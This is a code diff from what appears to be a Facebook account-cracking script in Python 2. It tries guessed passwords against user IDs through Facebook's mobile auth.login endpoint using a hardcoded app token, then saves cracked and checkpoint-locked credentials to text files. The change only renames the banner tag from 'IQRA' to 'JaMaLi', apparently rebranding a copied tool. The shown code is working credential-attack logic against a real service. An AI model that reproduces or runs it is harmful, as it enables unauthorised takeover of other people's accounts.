@@ -362,13 +362,13 @@ def crack_select():
             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;32m[IQRA-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;32m[JaMaLi-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('okids.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;31m[IQRA-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;31m[JaMaLi-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('cpids.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -384,7 +384,7 @@ def crack_select():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;31m[IQRA-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;31m[JaMaLi-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('cpids.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -400,7 +400,7 @@ def crack_select():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;31m[IQRA-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks IQRA
+                        print '\x1b[1;31m[JaMaLi-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks IQRA
                         cp = open('cpids.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
